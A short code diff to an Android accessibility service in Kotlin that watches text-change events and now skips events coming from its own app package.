@@ -23,6 +23,10 @@ class BuckService : AccessibilityService() {
 
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
         if (event.eventType != AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) return
+
+        // == IGNORE EVENTS FROM OUR OWN APP == //
+        if (event.packageName == packageName) return
+
         val node = event.source ?: return
         val text = event.text.joinToString(" ")
 
